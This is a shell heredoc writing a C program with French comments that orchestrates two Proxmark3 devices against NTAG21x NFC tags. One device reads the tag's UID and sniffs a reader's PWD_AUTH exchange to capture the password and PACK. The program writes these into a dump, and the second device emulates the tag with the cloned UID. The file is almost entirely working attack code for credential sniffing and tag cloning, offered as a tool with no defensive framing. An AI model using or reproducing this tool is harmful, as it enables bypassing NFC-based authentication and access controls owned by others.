cat << 'EOF' > sim.c
/*
 * ntag_relay.c
 *
 * Orchestrateur relay NTAG 21x :
 *   MOLE  : lit le tag, sniffe PWD/PACK via trace
 *   PROXY : eload le dump modifié, lance la sim
 *
 * Dépendances : Windows (CreateProcess, OVERLAPPED serial I/O)
 * Compiler : cl ntag_relay.c ou gcc -o ntag_relay ntag_relay.c
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ─── CONFIG ─────────────────────────────────────────────────── */
#define PROXY_PORT  "COM9"
#define MOLE_PORT   "COM10"
#define PM3_PATH    "client\\proxmark3.exe"
#define DUMP_FILE   "ntag_template.bin"   /* dump binaire de base à modifier */
#define BAUD        115200
#define CMD_TIMEOUT 15000  /* ms max pour attendre une réponse PM3 */

/* Pages NTAG215 (adapter si NTAG213/216) */
#define NTAG215_TOTAL_PAGES  135
#define PAGE_PWD             132   /* 4 bytes */
#define PAGE_PACK            133   /* 2 bytes + 2x00 */

/* ─── STRUCTURES ─────────────────────────────────────────────── */
typedef struct {
    HANDLE hPort;
    char   portName[16];
} PM3Handle;

typedef struct {
    uint8_t uid[7];
    uint8_t pwd[4];
    uint8_t pack[2];
    int     uid_len;
    int     got_pwd;
    int     got_pack;
} NTAGData;

/* ─── SERIAL ─────────────────────────────────────────────────── */
HANDLE serial_open(const char *port, DWORD baud) {
    char path[32];
    snprintf(path, sizeof(path), "\\\\.\\%s", port);

    HANDLE h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Impossible d'ouvrir %s (err %lu)\n", port, GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    DCB dcb = {0};
    dcb.DCBlength = sizeof(DCB);
    GetCommState(h, &dcb);
    dcb.BaudRate = baud;
    dcb.ByteSize = 8;
    dcb.Parity   = NOPARITY;
    dcb.StopBits = ONESTOPBIT;
    SetCommState(h, &dcb);

    COMMTIMEOUTS to = {0};
    to.ReadIntervalTimeout         = 50;
    to.ReadTotalTimeoutMultiplier  = 10;
    to.ReadTotalTimeoutConstant    = 2000;
    SetCommTimeouts(h, &to);

    return h;
}

void serial_write(HANDLE h, const char *cmd) {
    DWORD written;
    char buf[512];
    snprintf(buf, sizeof(buf), "%s\r\n", cmd);
    WriteFile(h, buf, (DWORD)strlen(buf), &written, NULL);
    printf("[>] %s\n", cmd);
    Sleep(200);
}

/* Lit jusqu'à trouver `marker` dans la sortie ou timeout.
   Copie la sortie complète dans `out` (max out_sz). */
int serial_read_until(HANDLE h, const char *marker,
                      char *out, int out_sz, DWORD timeout_ms) {
    int  pos   = 0;
    DWORD start = GetTickCount();
    out[0] = '\0';

    while (GetTickCount() - start < timeout_ms) {
        char c;
        DWORD rd;
        if (ReadFile(h, &c, 1, &rd, NULL) && rd == 1) {
            if (pos < out_sz - 1) {
                out[pos++] = c;
                out[pos]   = '\0';
            }
            if (strstr(out, marker)) return 1;
        }
    }
    return 0;
}

/* ─── PARSING ────────────────────────────────────────────────── */

/* Parse "hf mfu reader" output pour extraire l'UID */
int parse_uid(const char *buf, uint8_t *uid, int *uid_len) {
    /* Cherche "UID:" suivi de bytes hex séparés par espaces */
    const char *p = strstr(buf, "UID :");
    if (!p) p = strstr(buf, "UID:");
    if (!p) return 0;
    p += 5;
    while (*p == ' ') p++;

    *uid_len = 0;
    while (*uid_len < 7) {
        char byte_str[3] = {p[0], p[1], '\0'};
        if (!isxdigit((unsigned char)p[0])) break;
        uid[(*uid_len)++] = (uint8_t)strtol(byte_str, NULL, 16);
        p += 2;
        if (*p == ' ') p++;
    }
    return (*uid_len >= 4);
}

/* Parse "trace list -t mfu" pour trouver PWD_AUTH et PACK
 *
 * Dans la trace :
 *   Reader -> Tag : 1B AA BB CC DD      (PWD_AUTH + PWD 4 bytes)
 *   Tag -> Reader : EE FF               (PACK 2 bytes)
 */
int parse_trace(const char *buf, uint8_t *pwd, uint8_t *pack) {
    int got_pwd = 0, got_pack = 0;
    const char *p = buf;

    while (*p) {
        /* Cherche commande PWD_AUTH (0x1B) */
        const char *found = strstr(p, "1B ");
        if (!found) break;

        /* Vérifie qu'on a 4 bytes après */
        const char *q = found + 3;
        /* Skip espaces éventuels */
        while (*q == ' ') q++;

        uint8_t tmp[4];
        int ok = 1;
        for (int i = 0; i < 4; i++) {
            if (!isxdigit((unsigned char)q[0]) || !isxdigit((unsigned char)q[1])) {
                ok = 0; break;
            }
            char b[3] = {q[0], q[1], '\0'};
            tmp[i] = (uint8_t)strtol(b, NULL, 16);
            q += 2;
            while (*q == ' ') q++;
        }

        if (ok) {
            memcpy(pwd, tmp, 4);
            got_pwd = 1;

            /* La réponse PACK est sur la ligne suivante :
               cherche la prochaine ligne avec exactement 2 bytes hex */
            const char *nl = strchr(found, '\n');
            if (nl) {
                nl++;
                while (*nl == ' ' || *nl == '\t') nl++;
                if (isxdigit((unsigned char)nl[0]) && isxdigit((unsigned char)nl[1])) {
                    char b0[3] = {nl[0], nl[1], '\0'};
                    char b1[3] = {nl[3], nl[4], '\0'};
                    pack[0] = (uint8_t)strtol(b0, NULL, 16);
                    pack[1] = (uint8_t)strtol(b1, NULL, 16);
                    got_pack = 1;
                }
            }
        }
        p = found + 1;
    }
    return got_pwd && got_pack;
}

/* ─── DUMP ───────────────────────────────────────────────────── */
int patch_dump(const char *filename, const NTAGData *d) {
    FILE *f = fopen(filename, "r+b");
    if (!f) {
        fprintf(stderr, "[!] Impossible d'ouvrir %s\n", filename);
        return 0;
    }

    /* PWD page 132 */
    fseek(f, PAGE_PWD * 4, SEEK_SET);
    fwrite(d->pwd, 1, 4, f);

    /* PACK page 133 : 2 bytes PACK + 2 bytes 0x00 */
    uint8_t pack_page[4] = {d->pack[0], d->pack[1], 0x00, 0x00};
    fseek(f, PAGE_PACK * 4, SEEK_SET);
    fwrite(pack_page, 1, 4, f);

    fclose(f);
    printf("[+] Dump patché : PWD=%02X%02X%02X%02X  PACK=%02X%02X\n",
           d->pwd[0], d->pwd[1], d->pwd[2], d->pwd[3],
           d->pack[0], d->pack[1]);
    return 1;
}

/* ─── MAIN ───────────────────────────────────────────────────── */
int main(void) {
    char buf[8192];
    NTAGData tag = {0};

    printf("=== NTAG 21x Relay ===\n\n");

    /* ── 1. Ouvrir MOLE ── */
    printf("[*] Connexion MOLE (%s)...\n", MOLE_PORT);
    HANDLE mole = serial_open(MOLE_PORT, BAUD);
    if (mole == INVALID_HANDLE_VALUE) return 1;

    /* ── 2. Ouvrir PROXY ── */
    printf("[*] Connexion PROXY (%s)...\n", PROXY_PORT);
    HANDLE proxy = serial_open(PROXY_PORT, BAUD);
    if (proxy == INVALID_HANDLE_VALUE) { CloseHandle(mole); return 1; }

    Sleep(1000); /* laisser les PM3 s'initialiser */

    /* ── 3. MOLE : lire le tag ── */
    printf("\n[*] MOLE : lecture du tag...\n");
    serial_write(mole, "hf mfu reader");
    if (!serial_read_until(mole, "pm3 -->", buf, sizeof(buf), CMD_TIMEOUT)) {
        fprintf(stderr, "[!] Timeout lecture tag\n");
        goto cleanup;
    }
    printf("[trace]\n%s\n", buf);

    if (!parse_uid(buf, tag.uid, &tag.uid_len)) {
        fprintf(stderr, "[!] UID non trouvé — tag présent ?\n");
        goto cleanup;
    }
    printf("[+] UID : ");
    for (int i = 0; i < tag.uid_len; i++) printf("%02X ", tag.uid[i]);
    printf("\n");

    /* ── 4. MOLE : sniffer l'auth ── */
    printf("\n[*] MOLE : sniff en cours — approcher le lecteur du tag...\n");
    serial_write(mole, "hf 14a sniff -c -r");

    /* Attendre que l'utilisateur confirme l'échange (ou timeout 30s) */
    printf("[*] Appuyez sur ENTRÉE une fois que le lecteur a lu le tag...\n");
    getchar();

    /* Arrêter le sniff (envoyer une touche au PM3) */
    serial_write(mole, "");  /* ligne vide = stop sniff sur PM3 */
    Sleep(500);

    /* ── 5. MOLE : analyser la trace ── */
    printf("\n[*] MOLE : analyse de la trace...\n");
    serial_write(mole, "trace list -t mfu");
    if (!serial_read_until(mole, "pm3 -->", buf, sizeof(buf), CMD_TIMEOUT)) {
        fprintf(stderr, "[!] Timeout trace\n");
        goto cleanup;
    }
    printf("[trace]\n%s\n", buf);

    if (!parse_trace(buf, tag.pwd, tag.pack)) {
        fprintf(stderr, "[!] PWD/PACK non trouvés dans la trace.\n"
                        "    Vérifiez que le lecteur a bien effectué l'auth.\n");
        goto cleanup;
    }
    printf("[+] PWD  : %02X %02X %02X %02X\n",
           tag.pwd[0], tag.pwd[1], tag.pwd[2], tag.pwd[3]);
    printf("[+] PACK : %02X %02X\n", tag.pack[0], tag.pack[1]);

    /* ── 6. Patcher le dump ── */
    printf("\n[*] Patch du dump '%s'...\n", DUMP_FILE);
    if (!patch_dump(DUMP_FILE, &tag)) goto cleanup;

    /* ── 7. PROXY : envoyer le dump via eload ── */
    printf("\n[*] PROXY : chargement du dump...\n");
    {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "hf mfu eload -f %s", DUMP_FILE);
        serial_write(proxy, cmd);
        if (!serial_read_until(proxy, "pm3 -->", buf, sizeof(buf), CMD_TIMEOUT)) {
            fprintf(stderr, "[!] Timeout eload\n");
            goto cleanup;
        }
        printf("[proxy] %s\n", buf);
    }

    /* ── 8. PROXY : vérifier pages PWD/PACK ── */
    printf("\n[*] PROXY : vérification pages config...\n");
    serial_write(proxy, "hf mfu eview");
    serial_read_until(proxy, "pm3 -->", buf, sizeof(buf), CMD_TIMEOUT);
    /* Juste afficher, la vérification visuelle suffit */
    printf("[proxy eview]\n%s\n", buf);

    /* ── 9. PROXY : lancer la simulation ── */
    printf("\n[*] PROXY : démarrage simulation NTAG215 (type 7)...\n");
    {
        char uid_str[32] = {0};
        for (int i = 0; i < tag.uid_len; i++) {
            char tmp[4];
            snprintf(tmp, sizeof(tmp), "%02X", tag.uid[i]);
            strcat(uid_str, tmp);
        }
        char cmd[128];
        snprintf(cmd, sizeof(cmd), "hf 14a sim -t 7 -u %s", uid_str);
        serial_write(proxy, cmd);
        printf("[+] Simulation lancée avec UID %s\n", uid_str);
        printf("[*] Le PROXY répond maintenant comme le vrai tag.\n");
        printf("[*] Appuyez sur ENTRÉE pour arrêter la simulation.\n");
        getchar();
        /* Envoyer stop */
        serial_write(proxy, "");
    }

    printf("\n[+] Done.\n");

cleanup:
    CloseHandle(mole);
    CloseHandle(proxy);
    return 0;
}
EOF